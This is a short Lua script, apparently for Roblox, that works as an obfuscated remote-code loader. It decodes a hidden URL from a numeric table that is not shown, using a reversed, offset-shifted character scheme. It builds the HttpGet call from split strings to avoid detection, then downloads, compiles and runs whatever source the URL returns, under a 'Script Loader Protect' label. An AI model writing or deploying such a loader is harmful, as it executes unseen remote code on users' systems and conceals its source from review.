-- edb7c7bda8db08d23db87c5805b2a2b1737bcc0945775df73dc4e396c735e030

local function run()
    local _t = {}
    for _n in string.gmatch(table.concat(_P, "."), "%d+") do
        _t[#_t + 1] = _n
    end
    local _o = {}
    for _j = #_t, 1, -1 do
        local _p = _j - 1
        _o[#_o + 1] = string.char(tonumber(_t[_j]) - ((_p * 7 + 11) % 41 + 3))
    end
    local _u = table.concat(_o)
    local _g = game["Http" .. "Get"]

    local ok, err = pcall(function()
        local src = _g(game, _u)
        assert(src and #src > 0, "Empty source")
        local fn = loadstring(src)
        assert(fn, "Failed to compile source")
        fn()
    end)

    if not ok then
        warn("[Script Loader Protect] " .. tostring(err))
    end
end

run()
